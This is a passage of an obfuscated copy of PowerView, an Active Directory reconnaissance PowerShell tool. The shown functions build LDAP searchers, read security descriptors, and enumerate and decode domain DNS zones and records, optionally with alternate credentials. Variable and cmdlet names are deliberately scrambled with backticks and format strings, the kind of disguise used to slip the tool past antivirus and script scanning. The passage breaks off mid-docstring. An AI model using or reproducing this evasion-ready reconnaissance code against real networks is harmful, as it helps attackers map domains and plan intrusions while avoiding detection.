                ${O`BjECTPRO`P`E`Rt`IEs}[${_}] = (&("{3}{2}{1}{0}" -f 'ct','e','Obj','New-') ("{1}{0}" -f 'id','Gu') (,${p`Rop`ErTi`eS}[${_}][0])).Guid
            }
            elseif (${_} -eq 'useraccountcontrol') {
                ${OBj`EctPROP`er`TiEs}[${_}] = ${P`Ro`P`eRTiES}[${_}][0] -as ${UaCEN`UM}
            }
            elseif (${_} -eq 'ntsecuritydescriptor') {
                # $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                ${D`E`SCrIpT`oR} = &("{0}{1}{2}" -f'New','-','Object') ("{10}{2}{6}{5}{0}{7}{4}{8}{3}{9}{1}"-f'ntrol.RawS','or','i','Descri','curi','AccessCo','ty.','e','ty','pt','Secur') -ArgumentList ${PrO`pE`RTiES}[${_}][0], 0
                if (${DESc`R`I`PToR}.Owner) {
                    ${obJEcT`prOP`E`Rties}['Owner'] = ${DeSc`RIp`TOR}.Owner
                }
                if (${dES`C`RI`ptOr}.Group) {
                    ${Ob`jECt`PR`opErT`IeS}['Group'] = ${d`esc`R`IptOR}.Group
                }
                if (${DEsCr`I`ptor}.DiscretionaryAcl) {
                    ${ob`JecTpro`p`e`RtiEs}['DiscretionaryAcl'] = ${d`EScrip`TOr}.DiscretionaryAcl
                }
                if (${dE`Sc`RI`pToR}.SystemAcl) {
                    ${O`Bject`pROp`erties}['SystemAcl'] = ${D`e`SC`RIPtOR}.SystemAcl
                }
            }
            elseif (${_} -eq 'accountexpires') {
                if (${p`RoPeR`Ties}[${_}][0] -gt [DateTime]::MaxValue.Ticks) {
                    ${OBjE`Ctpr`O`PeRtI`ES}[${_}] = "NEVER"
                }
                else {
                    ${OBJ`EcTP`R`oPErt`IEs}[${_}] = [datetime]::fromfiletime(${ProPe`R`TIes}[${_}][0])
                }
            }
            elseif ( (${_} -eq 'lastlogon') -or (${_} -eq 'lastlogontimestamp') -or (${_} -eq 'pwdlastset') -or (${_} -eq 'lastlogoff') -or (${_} -eq 'badPasswordTime') ) {
                # convert timestamps
                if (${Pr`oPER`Ti`es}[${_}][0] -is [System.MarshalByRefObject]) {
                    # if we have a System.__ComObject
                    ${te`mP} = ${PRoPeR`Ti`es}[${_}][0]
                    [Int32]${H`IgH} = ${T`emp}.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, ${n`ULl}, ${Te`mp}, ${Nu`ll})
                    [Int32]${L`oW}  = ${t`EmP}.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, ${n`Ull}, ${TE`mP}, ${n`ULl})
                    ${oBJ`EC`T`PROpeRt`IEs}[${_}] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f ${H`igh}, ${L`Ow})))
                }
                else {
                    # otherwise just a string
                    ${oBJEcTPr`ope`RT`I`es}[${_}] = ([datetime]::FromFileTime((${pR`OpEr`Ti`es}[${_}][0])))
                }
            }
            elseif (${p`R`OperTieS}[${_}][0] -is [System.MarshalByRefObject]) {
                # try to convert misc com objects
                ${P`RoP} = ${propE`R`TieS}[${_}]
                try {
                    ${T`Emp} = ${pr`oP}[${_}][0]
                    [Int32]${h`iGH} = ${TE`Mp}.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, ${nu`LL}, ${t`EMp}, ${nU`ll})
                    [Int32]${l`Ow}  = ${Te`Mp}.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, ${nu`ll}, ${t`EMP}, ${n`ULL})
                    ${o`BJ`Ec`TpRoPE`RtI`Es}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${h`igh}, ${l`OW})
                }
                catch {
                    &("{3}{0}{1}{2}" -f 't','e-Verb','ose','Wri') "[Convert-LDAPProperty] error: $_"
                    ${OB`jEcTprOp`e`R`TIEs}[${_}] = ${Pr`OP}[${_}]
                }
            }
            elseif (${Pr`opeRtI`es}[${_}].count -eq 1) {
                ${o`BjEcTPrO`p`eRtIEs}[${_}] = ${PROPe`Rt`iEs}[${_}][0]
            }
            else {
                ${OBJ`E`CtPRoPErtI`ES}[${_}] = ${P`ROPErTI`es}[${_}]
            }
        }
    }
    try {
        &("{0}{3}{2}{1}" -f 'Ne','ct','e','w-Obj') -TypeName ("{1}{2}{0}"-f'bject','P','SO') -Property ${Ob`JECtPrO`P`ERtiEs}
    }
    catch {
        &("{4}{3}{1}{0}{2}" -f'in','arn','g','te-W','Wri') "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}


########################################################
#
# Domain info functions below.
#
########################################################

function Ge`T-DOMaiNs`eA`R`CHER {
<#
.SYNOPSIS

Helper used by various functions that builds a custom AD searcher object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain  

.DESCRIPTION

Takes a given domain and a number of customizations and returns a
System.DirectoryServices.DirectorySearcher object. This function is used
heavily by other LDAP/ADSI searcher functions (Verb-Domain*).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER SearchBasePrefix

Specifies a prefix for the LDAP search string (i.e. "CN=Sites,CN=Configuration").

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local

Return a searcher for all objects in testlab.local.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'

Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties.

.EXAMPLE

Get-DomainSearcher -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"

Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).

.OUTPUTS

System.DirectoryServices.DirectorySearcher
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = ${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`MA`in},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${LdaP`Fi`l`Ter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prO`pe`R`TIes},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${s`eaRChB`AsE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${sea`RCHba`se`PreF`IX},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Se`RVER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`EA`RCH`ScoPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eSUlt`PaGEsI`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RV`er`TImeLIMIt} = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${sECU`RIt`yMas`Ks},

        [Switch]
        ${TO`M`BstONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`DeNt`iaL} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if (${ps`BO`UNdp`ARaME`TErS}['Domain']) {
            ${ta`RgeTd`OmaIN} = ${D`OMAIN}

            if (${Env:u`sE`R`dnsDOM`A`IN} -and (${en`V:UseR`dNsdO`mAin}.Trim() -ne '')) {
                # see if we can grab the user DNS logon domain from environment variables
                ${USEr`doMA`In} = ${EN`V`:us`Erdnsdo`Main}
                if (${eNV`:LoGo`Nse`R`VER} -and (${En`V:lOgon`SE`RVer}.Trim() -ne '') -and ${usEr`doM`AIN}) {
                    ${bInds`e`RV`ER} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif (${P`sbOundPARA`MeT`ErS}['Credential']) {
            # if not -Domain is specified, but -Credential is, try to retrieve the current domain name with Get-Domain
            ${DOmAIn`O`B`jEcT} = &("{2}{1}{0}"-f'main','o','Get-D') -Credential ${crE`D`ENtiaL}
            ${BiND`ser`V`er} = (${D`oMA`INob`JEct}.PdcRoleOwner).Name
            ${t`ARGe`T`dOmaiN} = ${dOMaino`Bj`EcT}.Name
        }
        elseif (${eNV:USeRDNs`dom`A`in} -and (${eNV`:uS`eR`DNS`doMain}.Trim() -ne '')) {
            # see if we can grab the user DNS logon domain from environment variables
            ${TaR`Getdo`maiN} = ${e`Nv:USE`Rd`NSdoM`A`in}
            if (${ENV:`LogoN`S`er`Ver} -and (${ENv:`l`oG`o`NSERveR}.Trim() -ne '') -and ${tar`Ge`Tdo`m`Ain}) {
                ${BI`Nds`ervEr} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            # otherwise, resort to Get-Domain to retrieve the current domain object
            &("{2}{1}{0}" -f'e','erbos','write-v') "get-domain"
            ${doMaIn`obJE`ct} = &("{1}{0}{2}"-f 't-Doma','Ge','in')
            ${bIN`dsE`RveR} = (${dom`AINOBJ`ECt}.PdcRoleOwner).Name
            ${Tar`gETdo`MaiN} = ${do`mai`NOB`j`Ect}.Name
        }

        if (${Ps`Bo`U`ND`PARaME`TerS}['Server']) {
            # if there's not a specified server to bind to, try to pull a logon server from ENV variables
            ${Bi`NDsE`RveR} = ${s`e`RVER}
        }

        ${S`Ea`RCh`STR`inG} = 'LDAP://'

        if (${bINDs`ER`VER} -and (${bIn`D`SERVeR}.Trim() -ne '')) {
            ${seAr`ch`sT`RiNg} += ${b`iNds`ERVeR}
            if (${tARg`ETdo`mAIn}) {
                ${Se`ARC`hS`TRInG} += '/'
            }
        }

        if (${p`sBoUndPaR`AmETe`Rs}['SearchBasePrefix']) {
            ${SeaR`c`H`sTRi`Ng} += ${S`E`ARChB`ASePRefiX} + ','
        }

        if (${pSBoUN`DP`A`RAmEteRs}['SearchBase']) {
            if (${s`eARC`hB`AsE} -Match '^GC://') {
                # if we're searching the global catalog, get the path in the right format
                ${dN} = ${sE`AR`chBa`Se}.ToUpper().Trim('/')
                ${s`ear`c`hS`TrIng} = ''
            }
            else {
                if (${SE`Archb`AsE} -match '^LDAP://') {
                    if (${S`e`A`RcHBaSe} -match "LDAP://.+/.+") {
                        ${sEa`RchsTRi`Ng} = ''
                        ${dN} = ${sEaRcH`BA`sE}
                    }
                    else {
                        ${dN} = ${SEaR`Chb`A`sE}.SubString(7)
                    }
                }
                else {
                    ${DN} = ${se`A`RcHbA`SE}
                }
            }
        }
        else {
            # transform the target domain name into a distinguishedName if an ADS search base is not specified
            if (${ta`Rget`do`main} -and (${T`ARGet`DOMaIN}.Trim() -ne '')) {
                ${d`N} = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        ${S`EArcHSt`R`i`Ng} += ${d`N}
        &("{2}{0}{1}"-f 'rite-V','erbose','W') "[Get-DomainSearcher] search base: $SearchString"

        if (${Cr`EDe`N`TiAL} -ne [Management.Automation.PSCredential]::Empty) {
            &("{2}{0}{1}{3}" -f '-V','e','Write','rbose') "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
            # bind to the inital search object using alternate credentials
            ${d`OmAiNObJ`eCt} = &("{1}{2}{0}"-f'ct','Ne','w-Obje') ("{4}{0}{5}{1}{3}{6}{2}"-f 'rectorySer','s.Dire','yEntry','ct','Di','vice','or')(${SEaRC`Hs`T`RiNG}, ${C`Re`deNtial}.UserName, ${cre`dEnti`Al}.GetNetworkCredential().Password)
            ${SE`A`RcheR} = &("{2}{0}{1}"-f 'w-','Object','Ne') ("{7}{0}{1}{6}{5}{4}{2}{3}"-f 'y','stem.','.Direc','torySearcher','Services','y','Director','S')(${dOM`AINoBje`Ct})
        }
        else {
            # bind to the inital object using the current credentials
            ${sea`RCh`Er} = &("{1}{2}{0}" -f't','Ne','w-Objec') ("{9}{1}{7}{0}{2}{3}{8}{10}{6}{4}{5}"-f'recto','.','ryS','ervices','rche','r','ctorySea','Di','.','System','Dire')([ADSI]${SE`AR`chSTRINg})
        }

        ${SEAR`C`hEr}.PageSize = ${R`Es`UlT`PA`GeSize}
        ${s`E`Ar`cheR}.SearchScope = ${s`EaRcHSco`pE}
        ${S`EArc`Her}.CacheResults = ${f`AlSe}
        ${Se`ARc`HeR}.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if (${pSBouN`D`Pa`Ra`me`Ters}['ServerTimeLimit']) {
            ${sEa`Rc`HeR}.ServerTimeLimit = ${sE`RV`ErtIMeli`mit}
        }

        if (${pSbOund`ParAm`Et`eRS}['Tombstone']) {
            ${SeA`R`ch`ER}.Tombstone = ${T`RUe}
        }

        if (${p`s`BOu`NdPArAmeTERs}['LDAPFilter']) {
            ${S`EAr`cheR}.filter = ${l`DApF`IL`TEr}
        }

        if (${pSB`O`UNdpa`Rame`TERS}['SecurityMasks']) {
            ${S`eAr`CHeR}.SecurityMasks = Switch (${SE`curITyM`As`kS}) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if (${pSBOunDpAR`AmE`T`ERs}['Properties']) {
            # handle an array of properties to load w/ the possibility of comma-separated strings
            ${p`RoPertI`es`TOloAD} = ${pr`opErTi`eS}| &("{0}{1}{2}{3}"-f 'ForE','ach-Ob','je','ct') { ${_}.Split(',') }
            ${N`UlL} = ${se`ArcheR}.PropertiesToLoad.AddRange((${pRopE`RT`iES`TolO`Ad}))
        }

        ${SEAR`Ch`eR}
    }
}


function CON`Ver`T`-DNSreCOrD {
<#
.SYNOPSIS

Helpers that decodes a binary DNS record blob.

Author: Michael B. Smith, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Decodes a binary blob representing an Active Directory DNS entry.
Used by Get-DomainDNSRecord.

Adapted/ported from Michael B. Smith's code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1

.PARAMETER DNSRecord

A byte array representing the DNS record.

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs custom PSObjects with detailed information about the DNS record entry.

.LINK

https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
#>

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${T`RuE}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Byte[]]
        ${dN`sReCO`RD}
    )

    BEGIN {
        function gE`T`-NAME {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${r`AW}
            )

            [Int]${L`eN`gth} = ${r`AW}[0]
            [Int]${sE`GM`EntS} = ${r`Aw}[1]
            [Int]${i`NdEX} =  2
            [String]${N`AME}  = ''

            while (${Se`gme`N`TS}-- -gt 0)
            {
                [Int]${sEgMEn`TlEn`g`TH} = ${R`Aw}[${in`D`eX}++]
                while (${segm`ENt`lENGtH}-- -gt 0) {
                    ${N`AmE} += [Char]${r`Aw}[${iN`dex}++]
                }
                ${NA`ME} += "."
            }
            ${nA`mE}
        }
    }

    PROCESS {
        # $RDataLen = [BitConverter]::ToUInt16($DNSRecord, 0)
        ${r`D`ATaTyPe} = [BitConverter]::ToUInt16(${dnS`REc`Ord}, 2)
        ${up`d`AtEd`AT`SeriAl} = [BitConverter]::ToUInt32(${DnSreC`O`Rd}, 8)

        ${tTL`R`AW} = ${D`NSReC`ord}[12..15]

        # reverse for big endian
        ${Nu`ll} = [array]::Reverse(${ttL`R`AW})
        ${t`Tl} = [BitConverter]::ToUInt32(${T`TLRaw}, 0)

        ${A`gE} = [BitConverter]::ToUInt32(${dNSre`cO`RD}, 20)
        if (${a`ge} -ne 0) {
            ${times`TA`MP} = ((&("{2}{1}{0}"-f 'e','-Dat','Get') -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours(${a`GE})).ToString()
        }
        else {
            ${t`i`mEStAMP} = '[static]'
        }

        ${dNsRe`c`oRdobj`eCT} = &("{0}{1}{2}" -f 'Ne','w-O','bject') ("{1}{2}{0}" -f't','PSObj','ec')

        if (${Rd`Atat`y`pe} -eq 1) {
            ${I`P} = "{0}.{1}.{2}.{3}" -f ${dN`SRE`CoRd}[24], ${D`Nsre`coRd}[25], ${DnSRec`O`Rd}[26], ${dn`sRE`C`OrD}[27]
            ${D`ATa} = ${i`p}
            ${DnsrECo`R`DOB`jeCt} | &("{0}{1}{2}" -f'Add-Mem','b','er') ("{2}{3}{0}{1}"-f 'proper','ty','N','ote') 'RecordType' 'A'
        }

        elseif (${Rdat`AT`Ype} -eq 2) {
            ${nS`NAME} = &("{2}{0}{1}"-f 't','-Name','Ge') ${dNsr`Ec`O`RD}[24..${dNS`R`eCo`RD}.length]
            ${D`Ata} = ${NSn`Ame}
            ${D`NSre`cORdoBje`cT} | &("{0}{1}{2}"-f'Ad','d-Membe','r') ("{0}{2}{1}"-f 'Notep','rty','rope') 'RecordType' 'NS'
        }

        elseif (${rD`Ata`TYPe} -eq 5) {
            ${a`lias} = &("{2}{0}{1}" -f 'et','-Name','G') ${DNsr`ecO`RD}[24..${D`NSreC`Ord}.length]
            ${D`ATa} = ${A`LI`As}
            ${dnSR`ecOr`do`Bj`eCt} | &("{1}{2}{0}"-f'er','Add-M','emb') ("{2}{1}{0}{3}" -f't','oteproper','N','y') 'RecordType' 'CNAME'
        }

        elseif (${rd`AT`ATypE} -eq 6) {
            # TODO: how to implement properly? nested object?
            ${d`Ata} = $([System.Convert]::ToBase64String(${Dn`Sr`EcO`Rd}[24..${Dn`sr`eCOrD}.length]))
            ${d`NSREC`ordoB`jEcT} | &("{0}{2}{1}"-f'Add-M','r','embe') ("{1}{0}{3}{2}"-f'oteprope','N','y','rt') 'RecordType' 'SOA'
        }

        elseif (${rd`AT`A`TYpe} -eq 12) {
            ${p`TR} = &("{1}{2}{0}"-f 'e','Ge','t-Nam') ${D`Nsr`eCorD}[24..${d`NsR`eCORD}.length]
            ${D`Ata} = ${P`TR}
            ${d`NSrec`ordobJE`ct} | &("{0}{1}{2}{3}"-f'A','dd-M','emb','er') ("{2}{3}{0}{1}"-f'ep','roperty','N','ot') 'RecordType' 'PTR'
        }

        elseif (${r`d`ATAt`YPe} -eq 13) {
            # TODO: how to implement properly? nested object?
            ${D`Ata} = $([System.Convert]::ToBase64String(${dN`SR`ECoRd}[24..${DNs`R`ecOrD}.length]))
            ${DnsR`ECoR`dOB`J`ect} | &("{1}{2}{0}" -f 'Member','Add','-') ("{1}{0}{3}{2}" -f'ot','N','y','epropert') 'RecordType' 'HINFO'
        }

        elseif (${RDat`AT`Y`PE} -eq 15) {
            # TODO: how to implement properly? nested object?
            ${D`ATA} = $([System.Convert]::ToBase64String(${dn`sREC`orD}[24..${Dn`Sr`eCoRd}.length]))
            ${DnS`RecO`RdOB`jE`CT} | &("{0}{1}{2}" -f 'Add','-Me','mber') ("{2}{1}{0}" -f'ty','oteproper','N') 'RecordType' 'MX'
        }

        elseif (${RdATAt`y`pe} -eq 16) {
            [string]${T`Xt}  = ''
            [int]${S`E`GmentlEngth} = ${D`Nsr`eco`RD}[24]
            ${InD`Ex} = 25

            while (${Segme`NTleng`Th}-- -gt 0) {
                ${t`xT} += [char]${d`NSr`eco`RD}[${in`Dex}++]
            }

            ${dA`TA} = ${T`XT}
            ${dNSrEc`OrDO`BJeCT} | &("{0}{2}{1}" -f'Add-M','ber','em') ("{0}{1}{2}" -f'Noteprope','rt','y') 'RecordType' 'TXT'
        }

        elseif (${rdaT`A`T`YPe} -eq 28) {
            # TODO: how to implement properly? nested object?
            ${DA`TA} = $([System.Convert]::ToBase64String(${D`N`SReCORd}[24..${d`NSr`eCORd}.length]))
            ${DNSrEc`O`R`dObJECT} | &("{1}{2}{0}"-f'Member','A','dd-') ("{3}{2}{1}{0}" -f 'y','ropert','otep','N') 'RecordType' 'AAAA'
        }

        elseif (${R`dat`AtypE} -eq 33) {
            # TODO: how to implement properly? nested object?
            ${d`ATa} = $([System.Convert]::ToBase64String(${DNSreC`o`Rd}[24..${dNsrE`c`oRD}.length]))
            ${d`NSRE`CoRDo`Bj`ect} | &("{2}{1}{3}{0}" -f'er','d-M','Ad','emb') ("{1}{2}{0}"-f'ty','Notepr','oper') 'RecordType' 'SRV'
        }

        else {
            ${d`AtA} = $([System.Convert]::ToBase64String(${D`NSR`ecOrD}[24..${dN`s`Re`CORd}.length]))
            ${dnsr`eCoRd`ObJ`EcT} | &("{0}{2}{1}"-f 'Add','ember','-M') ("{0}{2}{1}" -f'Noteprope','y','rt') 'RecordType' 'UNKNOWN'
        }

        ${d`N`s`REc`oRdobJeCt} | &("{0}{3}{2}{1}" -f 'Add-M','er','b','em') ("{0}{1}{2}"-f'Not','epropert','y') 'UpdatedAtSerial' ${u`pDA`TEdA`Tseri`Al}
        ${dNSrE`CO`R`D`o`BJeCt} | &("{0}{1}{2}" -f'Add-','M','ember') ("{2}{1}{3}{0}" -f 'roperty','t','No','ep') 'TTL' ${t`Tl}
        ${dNSrEcO`Rd`ob`j`ECt} | &("{2}{0}{1}{3}"-f 'M','emb','Add-','er') ("{1}{0}{2}" -f 'epropert','Not','y') 'Age' ${A`gE}
        ${DNS`REco`R`dObJ`ECT} | &("{0}{1}{2}"-f 'A','d','d-Member') ("{0}{3}{1}{2}"-f'N','e','rty','oteprop') 'TimeStamp' ${T`iMest`AMP}
        ${d`Ns`RECoR`DO`Bject} | &("{0}{1}{2}" -f 'Ad','d-Membe','r') ("{1}{3}{2}{0}"-f 'y','Notep','pert','ro') 'Data' ${d`Ata}
        ${dNSrec`orDo`Bj`eCT}
    }
}


function ge`T-d`Oma`INdNsZone {
<#
.SYNOPSIS

Enumerates the Active Directory DNS zones for a given domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.PARAMETER Domain

The domain to query for zones, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDNSZone

Retrieves the DNS zones for the current domain.

.EXAMPLE

Get-DomainDNSZone -Domain dev.testlab.local -Server primary.testlab.local

Retrieves the DNS zones for the dev.testlab.local domain, binding to primary.testlab.local.

.OUTPUTS

PowerView.DNSZone

Outputs custom PSObjects with detailed information about the DNS zone.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`O`maiN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Se`R`VEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`OP`ertiES},

        [ValidateRange(1, 10000)]
        [Int]
        ${ResU`lT`pAGesI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seR`Vert`imELIm`It},

        [Alias('ReturnOne')]
        [Switch]
        ${fi`Nd`ONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creDe`N`TIAl} = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ${SEA`Rch`ER`ARgUMENTS} = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if (${Ps`Bo`UnDPa`RAMeT`ERs}['Domain']) { ${SeA`RCher`Ar`g`UM`entS}['Domain'] = ${d`omaIN} }
        if (${pS`B`oUND`ParAmETers}['Server']) { ${SE`A`Rche`R`ArGuMEnTS}['Server'] = ${s`E`RvEr} }
        if (${p`sbOun`DpA`RaM`eTers}['Properties']) { ${SE`ArcHer`ARGuM`entS}['Properties'] = ${PrOP`ert`ieS} }
        if (${psBOU`NDpa`RaMet`eRs}['ResultPageSize']) { ${S`e`ArcH`era`RgUME`NtS}['ResultPageSize'] = ${R`e`sU`lTp`AGEsizE} }
        if (${PSBouNDPA`RaME`T`eRs}['ServerTimeLimit']) { ${SEaR`cHeRA`Rg`UmenTs}['ServerTimeLimit'] = ${S`ERvErTI`mElimIt} }
        if (${PsB`ounDP`A`RameTERs}['Credential']) { ${SearC`her`AR`G`UMeN`Ts}['Credential'] = ${crE`Den`T`Ial} }
        ${DNSsEa`RCHe`R1} = &("{1}{3}{0}{2}"-f 'inS','Get-D','earcher','oma') @SearcherArguments

        if (${D`NSS`E`ArcHer1}) {
            if (${psb`ou`NdP`ARamETeRs}['FindOne']) { ${res`UL`TS} = ${DN`S`sEaR`cHer1}.FindOne()  }
            else { ${rE`s`ULTS} = ${D`NssE`ARCH`e`R1}.FindAll() }
            ${res`UlTS} | &("{3}{2}{1}{0}" -f 'ect','bj','ere-O','Wh') {${_}} | &("{2}{1}{0}"-f 't','ach-Objec','ForE') {
                ${O`UT} = &("{3}{0}{1}{5}{2}{4}"-f'onv','ert-LD','ope','C','rty','APPr') -Properties ${_}.Properties
                ${O`UT} | &("{1}{0}{2}" -f '-Membe','Add','r') ("{3}{1}{2}{0}"-f'roperty','t','eP','No') 'ZoneName' ${o`Ut}.name
                ${o`Ut}.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                ${O`Ut}
            }

            if (${resU`l`TS}) {
                try { ${REsul`TS}.dispose() }
                catch {
                    &("{0}{2}{1}" -f 'Wr','se','ite-Verbo') "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                }
            }
            ${dnsS`eARCH`e`R1}.dispose()
        }

        ${sea`RCH`ERargumE`NtS}['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        ${dN`sSeArC`H`Er2} = &("{2}{3}{0}{1}"-f'Search','er','Get-Doma','in') @SearcherArguments

        if (${Dn`s`searCheR2}) {
            try {
                if (${PsbouNDpARAmE`T`E`Rs}['FindOne']) { ${R`esul`TS} = ${DNssE`A`R`Che`R2}.FindOne() }
                else { ${r`e`SUlts} = ${DnSS`E`ARc`Her2}.FindAll() }
                ${RE`SU`LtS} | &("{0}{1}{2}" -f 'Wh','ere-Obj','ect') {${_}} | &("{1}{2}{0}{3}"-f 'bjec','For','Each-O','t') {
                    ${O`Ut} = &("{1}{3}{0}{2}" -f'ert-LDAPPro','Con','perty','v') -Properties ${_}.Properties
                    ${O`UT} | &("{1}{0}{2}{3}"-f 'mb','Add-Me','e','r') ("{0}{1}{2}{3}"-f 'No','t','ePro','perty') 'ZoneName' ${o`UT}.name
                    ${O`UT}.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    ${O`UT}
                }
                if (${r`Esu`lts}) {
                    try { ${ResU`L`Ts}.dispose() }
                    catch {
                        &("{2}{0}{3}{1}" -f 'rit','se','W','e-Verbo') "[Get-DomainDNSZone] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                &("{3}{1}{2}{0}" -f 'ose','Ver','b','Write-') "[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            ${dNS`sE`ARCH`Er2}.dispose()
        }
    }
}


function g`et-D`OmAind`NSr`eCo`RD {
<#
.SYNOPSIS

Enumerates the Active Directory DNS records for a given zone.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-DNSRecord  

.DESCRIPTION

Given a specific Active Directory DNS zone name, query for all 'dnsNode'
LDAP entries using that zone as the search base. Return all DNS entry results
and use Convert-DNSRecord to try to convert the binary DNS record blobs.

.PARAMETER ZoneName

Specifies the zone to query for records (which can be enumearted with Get-DomainDNSZone).

.PARAMETER Domain

The domain to query for zones, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDNSRecord -ZoneName testlab.local

Retrieve all records for the testlab.local zone.

.EXAMPLE

